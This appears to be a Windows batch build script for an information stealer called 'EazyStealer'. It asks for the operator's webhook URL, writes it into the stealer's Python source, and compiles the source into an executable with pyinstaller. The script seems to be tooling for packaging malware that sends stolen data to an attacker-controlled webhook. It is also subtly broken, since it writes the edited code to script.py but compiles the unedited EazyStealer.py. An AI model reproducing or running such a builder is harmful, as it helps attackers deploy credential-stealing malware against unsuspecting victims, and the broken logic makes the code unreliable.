@echo off
setlocal

set /p webhook_url=Please enter your webhook URL: 

powershell -Command "(gc EazyStealer.py) -replace 'your_hook', '%webhook_url%' | Out-File script.py"

pyinstaller EazyStealer.py

echo Build complete! Your executable is located in the dist folder.
endlocal
pause